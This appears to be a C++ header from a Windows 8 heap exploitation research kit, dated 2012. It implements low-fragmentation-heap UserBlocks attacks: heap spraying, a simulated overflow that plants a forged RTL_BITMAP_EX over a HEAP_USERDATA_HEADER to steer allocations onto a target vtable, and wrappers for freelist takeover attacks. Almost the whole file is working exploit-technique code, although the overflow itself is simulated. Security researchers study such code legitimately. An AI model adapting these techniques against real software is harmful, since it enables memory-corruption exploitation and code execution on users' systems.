/**
 * @file W8Heap.h
 * @author created by: Peter Hlavaty
 * @author created on: 2012/06/26
 */

#ifndef __W8HEAP_H__
#define __W8HEAP_H__

#include "Heap.h"
#include "W7Heap.h"

#include "automalloc.h"
#include "debug.h"

#ifdef WIN8

class CW8Heap : private CW7Heap
{
#define LFH_BIN_SIZE(n) 0x4000

#define BIT_MASK_COUNT			0x8 /*1 ^ 8 = 0x100 == 0xFF + 1 == bitmask 011111111b*/
#define PTR_BIT_MASK_COUNT		(sizeof(ULONG_PTR) * BIT_MASK_COUNT)
#define SIZE_OF_BITMAP			((((delta / (block_stride * BIT_MASK_COUNT)) + sizeof(ULONG_PTR)) + HEAP_MIN_PAGE_SIZE) & ~(HEAP_MIN_PAGE_SIZE - 1))

#define USERBLOCK1_MAX_ALLOC(n)	(GetLfhBinSize(n, true) / ((n + 1) * HEAP_MIN_PAGE_SIZE))
#define USERBLOCK2_MAX_ALLOC(n)	(USERBLOCK1_MAX_ALLOC(n) + (GetLfhBinSize(n, false) / ((n + 1) * HEAP_MIN_PAGE_SIZE)) - 1)
#define USERBLOCK3_MIN_ALLOC(n)	(USERBLOCK2_MAX_ALLOC(n) + 5)

public:
	void* Alloc(__in size_t n)
	{
		return CHeap::Alloc(n);
	}

	void Free(__in void* block)
	{
		CHeap::Free(block);
	}

public:
	void LFHTest()
	{
		srand ( (unsigned int)time((time_t)NULL) );
		BYTE n = (rand() % (0x2f)) + 0x40;

		CDebug::WaitForDbg();
		CDebug::DbgPrint("\ntest for %x\n\n\n\n\ncommand : .load pykd.pyd; .reload; !py win8\n\n", n);
		CDebug::KeBreak();

		if (!ActivateLFH(n))
			return;

		CDebug::DbgPrint("\nLFH ACTIVATED : %x  -> [fill == 0x13 + (%i) / %i]\n\n\n\ncommand : .load pykd.pyd; .reload; !py win8\n\n", n, USERBLOCK1_MAX_ALLOC(n), USERBLOCK2_MAX_ALLOC(n));
		CDebug::KeBreak();

		CDebug::DbgPrint("for entry %x", USERBLOCK1_MAX_ALLOC(n));
		void* lfh_chunks[0x1000];
		for (int i = 0; i < USERBLOCK3_MIN_ALLOC(n); i++)//trigger creation of UserBlock2 + fill it! {one free record left!}
		{
			CHECK_ALLOC_RET(lfh_chunks[i], n);
			CDebug::DbgPrint("\n[%x] !py win8 -heap %p %x", i, (ULONG_PTR)(lfh_chunks[i]), n * HEAP_MIN_PAGE_SIZE);
		}

		for (int i = USERBLOCK2_MAX_ALLOC(n); i < 0x100; i++)
		{
			CDebug::DbgPrint("\n%p (%i)", (ULONG_PTR)(lfh_chunks[i - 1]), i);
			CHECK_ALLOC_RET(lfh_chunks[i], n);
		}

		for (int i = 0; i < USERBLOCK2_MAX_ALLOC(n) + 0x100 * 2; i++)
			Free(lfh_chunks[i]);
		
		CDebug::DbgPrint("\nfreed...\n");
		CDebug::KeBreak();
	}

//win8 - frontend
	__checkReturn bool UserBlocksVTableAttack(__in BYTE n, __in void* vtable)
	{
		if (n >= ARRAY_SIZE)
			return false;

//invoke LFH on targeted chunk
		if (!ActivateLFH(n))
			return false;

		CDebug::DbgPrint("\nLFH ACTIVATED for %x [fill == 0x12 + {%i - to USERBLOCK1; %i - to fill USERBLOCK1]\n", n, USERBLOCK1_MAX_ALLOC(n), USERBLOCK2_MAX_ALLOC(n));

		void* lfh_chunks[0x100];
		for (int i = 0; i < USERBLOCK3_MIN_ALLOC(n); i++)//trigger creation of UserBlock2 + UserBlock3
		{
			CHECK_ALLOC_RETB(lfh_chunks[i], n);
			CDebug::DbgPrint("\nlfh chunk addr : %p", (ULONG_PTR)(lfh_chunks[i]));
		}


//get heap_userdata_header numero 2
		HEAP_USERDATA_HEADER* t_user_data_header = NULL;
		if (!GetNextUserDataBin(lfh_chunks[USERBLOCK1_MAX_ALLOC(n)], (n + 1) * HEAP_MIN_PAGE_SIZE, &t_user_data_header, n))	//cause of find delta
		{
			CDebug::DbgPrint("\n_HEAP_USERDATA_HEADERs dont lay side by side ...\n");
			return false;
		}

		CDebug::DbgPrint("\n_USER_DATA_BIN %p [sizeofbitmap %x]\n", (ULONG_PTR)(t_user_data_header), t_user_data_header->BusyBitmap.SizeOfBitMap);
		//CDebug::KeBreak();

//target attack!
		WORD block_stride = (0xFFFF + 1) / 4; // == 0x4000; good HIGH_DWORD for heapspray! and for blocksstride big enough! 

		//data leak .. prerequisite -> we need to know how far is target
		ULONG_PTR delta = (ULONG_PTR)vtable - (ULONG_PTR)t_user_data_header;	//specific! if target app vuln c++ vtable, you have to known this distance!!

		
		CAutoMalloc auto_m(SIZE_OF_BITMAP);//alloc from another heap :P .. nothing to do with attack

		BYTE* bitmapdata = (BYTE*)auto_m.GetMemory(); //[0x10000 * sizeof(ULONG_PTR)];
		if (!bitmapdata)
		{
			CDebug::DbgPrint("\nbitmapdata alloc fail! [%x]\n", SIZE_OF_BITMAP);
			return false;
		}

//prepare attack
		size_t bitmap_index = (delta / block_stride);
		memset(bitmapdata, -1, SIZE_OF_BITMAP); //all chunks == busy

		//(bitmap_index / PTR_BIT_MASK_COUNT)  =>  target ULONG_PTR inside bitmapbuff
		//((bitmap_index % PTR_BIT_MASK_COUNT) / sizeof(ULONG_PTR))  =>  target BYTE inside ULONG_PTR part of bitmapbuff!
		BYTE* byte_to_set = (BYTE*)((ULONG_PTR*)bitmapdata + (bitmap_index / PTR_BIT_MASK_COUNT)) + ((bitmap_index % PTR_BIT_MASK_COUNT) / sizeof(ULONG_PTR));
		*byte_to_set &= ~(1 << (((bitmap_index % PTR_BIT_MASK_COUNT) % sizeof(ULONG_PTR)) % BIT_MASK_COUNT));
		
		//set backup byte!! ... non-determinism ?? not so big deal as it seems ...
		byte_to_set += sizeof(ULONG_PTR);
		*byte_to_set = 0;//this ULONG_PTR part of bitmap signalize that this bin have more chunks to allocate ..

		//==> (user_data_header.BlockStride << (4 * 4)) | user_data_header.FirstAllocationOffset;
		ULONG_PTR spray_addr = (block_stride << (4 * 4)) | (WORD)(delta % block_stride);
		if (!HeapSpray(0x100000 / HEAP_MIN_PAGE_SIZE, SIZE_OF_BITMAP, bitmapdata, spray_addr))
		{
			CDebug::DbgPrint("\n HeapSpray failed...\n");
			return false;
		}

		CDebug::DbgPrint("\n\nbitmap_index %x ++ bitmap pos : %x\nsize of bitmap : %x", bitmap_index / PTR_BIT_MASK_COUNT, bitmap_index % PTR_BIT_MASK_COUNT, SIZE_OF_BITMAP);

		//CDebug::WaitForDbg();
		CDebug::DbgPrint("\n.load pykd.pyd; .reload; !py win8 -heap %p %x\n", (ULONG_PTR)(lfh_chunks[USERBLOCK1_MAX_ALLOC(n)]), n * HEAP_MIN_PAGE_SIZE);
		//CDebug::KeBreak();

//overflow simulation
		//HEAP_USERDATA_HEADER is aligned on 0x10! and magic -> we overflow with 0x10 RTL_BITMAP_EX ;)!
		//1. garbage : DQ {SubSegment} <- (RTL_BITMAP_EX.Size), DQ {Reserved} <- (RTL_BITMAP_EX.Buffer), DQ {SizeIndexAndPadding, Signature} <- (RTL_BITMAP_EX.Size)
		//2. target : DQ {FirstAllocationOffset, BlockStride, ReservedB} <- (RTL_BITMAP_EX.Buffer), DQ {RTL_BITMAP_EX.Size} <- (RTL_BITMAP_EX.Size), DQ {RTL_BITMAP_EX.Buffer} <- (RTL_BITMAP_EX.Buffer)
		RTL_BITMAP_EX bitmap = { SIZE_OF_BITMAP * BIT_MASK_COUNT, (BYTE*)spray_addr };

//main idea, rewrite all allocated chunks from userblock1 + userblock2 - second prerequisite ..
		for (int i = USERBLOCK1_MAX_ALLOC(n); i < USERBLOCK3_MIN_ALLOC(n); i++)
		{
			//dummy overwrite
			memset(lfh_chunks[i], 'X', n * HEAP_MIN_PAGE_SIZE);
			
			//targeted overflow, size == 2x sizeof(buffer)
			RtlFillMemoryWithBuffer((BYTE*)(lfh_chunks[i]) + n * HEAP_MIN_PAGE_SIZE, (n * HEAP_MIN_PAGE_SIZE) / sizeof(bitmap), &bitmap, sizeof(bitmap));
		}
		//RtlFillMemoryWithBuffer(t_user_data_header, sizeof(*t_user_data_header) / sizeof(bitmap), &bitmap, sizeof(bitmap));//explicit rewrite

		CDebug::WaitForDbg();

//just for dbg reasons ...
		size_t i = 0;
		WORD mul = 0;
		ULONG_PTR* bitmat_buffer = (ULONG_PTR*)t_user_data_header->BusyBitmap.Buffer;
		for (; i < t_user_data_header->BusyBitmap.SizeOfBitMap / sizeof(ULONG_PTR); i++)
		{
			ULONG_PTR ptr_bitmask = *bitmat_buffer;
			CDebug::DbgPrint("\nptrmask : %p", ptr_bitmask);
			if (-1 != ptr_bitmask)
			{
				ptr_bitmask ^= -1;
				while (ptr_bitmask)
				{
					ptr_bitmask >>= 1;
					mul++;
				}
				mul--;
				break;
			}
			bitmat_buffer++;
		}
		ULONG_PTR dest_addr = (ULONG_PTR)t_user_data_header + t_user_data_header->FirstAllocationOffset + t_user_data_header->BlockStride * (PTR_BIT_MASK_COUNT * i + mul);
		CDebug::DbgPrint("\n\n\n^^^^^^^^^^^^^^^^^^^^^^^^^\n\ntarget : %p\nuserdata %p\nnext_chunk %p [%p, %p]\n\n$$$$$$$$$$$$$$$$$$$$$$$$$\n\n", (ULONG_PTR)vtable, (ULONG_PTR)t_user_data_header, dest_addr, i, mul);

		return true;
	}

	//just demonstration
	__checkReturn bool UserBlocksAttackPoC(__in BYTE n)
	{
		if (n >= ARRAY_SIZE)
			return false;

		if (!ActivateLFH(n))
			return false;

		//BusyBitmap.Buffer = spray_addr -> heap sprayed!
		//BlockStride = (n - 0x10) * 0x10
		//FirstAllocationOffset = 3

		//+ heap_entry.ExtendedBlockSignature = (HIGH_BYTE(FirstAllocationOffset)) = 0 => & 0x3F pass! ()
		//f.e. if FirstAllocationOffset == 0, then heap_entry.ExtendedBlockSignature = HIGH_BYTE(BlockStride)
		//..because we overflow with RTL_BITMAP_EX(1, spray_addr) => sizeof == 0x10
		ULONG_PTR spray_addr = (n - 0x10) << (0x4 * 5) | 3;

		//BitmapData = 0x11111001 == alloc first and second entry!
		BYTE bitmapdata = ~0x6;
		if (!HeapSpray(0x100000 / HEAP_MIN_PAGE_SIZE, sizeof(bitmapdata), &bitmapdata, spray_addr))
			return false;

		void* lfh_chunks[0x200];
		for (int i = 0; i < USERBLOCK3_MIN_ALLOC(n); i++)//invoke creation of 3 userblocks, userblock3 follow userblock2!!
			CHECK_ALLOC_RETB(lfh_chunks[i], n);

//simulate overflow!

		//HEAP_USERDATA_HEADER is aligned on 0x10! and magic -> we overflow with 0x10 RTL_BITMAP_EX ;)!
		//DQ {FirstAllocationOffset, BlockStride, ReservedB} (RTL_BITMAP_EX.Buffer), DQ {RTL_BITMAP_EX.Size} (RTL_BITMAP_EX.Size), DQ {RTL_BITMAP_EX.Buffer} (RTL_BITMAP_EX.Buffer)
		RTL_BITMAP_EX bitmap = { sizeof(bitmapdata) * BIT_MASK_COUNT, (BYTE*)spray_addr };
		for (int i = USERBLOCK1_MAX_ALLOC(n); i < USERBLOCK3_MIN_ALLOC(n); i++)
		{
			//dummy overwrite
			memset(lfh_chunks[i], 'X', n * HEAP_MIN_PAGE_SIZE);

			//targeted overflow, size == 2x sizeof(buffer)
			RtlFillMemoryWithBuffer((BYTE*)(lfh_chunks[i]) + n * HEAP_MIN_PAGE_SIZE, (n * HEAP_MIN_PAGE_SIZE) / sizeof(bitmap), &bitmap, sizeof(bitmap));
		}

		return true;
	}


	//backend - both this backed exploitation techniques can be used also since winXP till windows 8 CP
	__checkReturn bool FreelistFreeToOwnAttack(__in short n)
	{
		return CW7Heap::FreelistFreeToOwnAttack(n);		
	}

	//usefull only on x86 third parties binaries! (disable on failure cookie == false)
	__checkReturn bool FreelistSearchToOwnHeapAttack(__in short n)
	{
		return CW7Heap::FreelistSearchToOwnHeapAttack(n);
	}

protected:
	//exactly purpose is to get third data bin ...
	__checkReturn bool GetNextUserDataBin(__in void* lfhChunk, __in WORD blocksStride, __out HEAP_USERDATA_HEADER** userDataHeader, __in BYTE n)
	{
		for (ULONG i = blocksStride; i < GetLfhBinSize(n, false); i++)
		{
			*userDataHeader = (HEAP_USERDATA_HEADER*)((ULONG_PTR)lfhChunk + i);

			if (blocksStride == (*userDataHeader)->BlockStride)
				return true;
		}
		return false;
	}
};

#endif //WIN8

#endif //__W8HEAP_H__
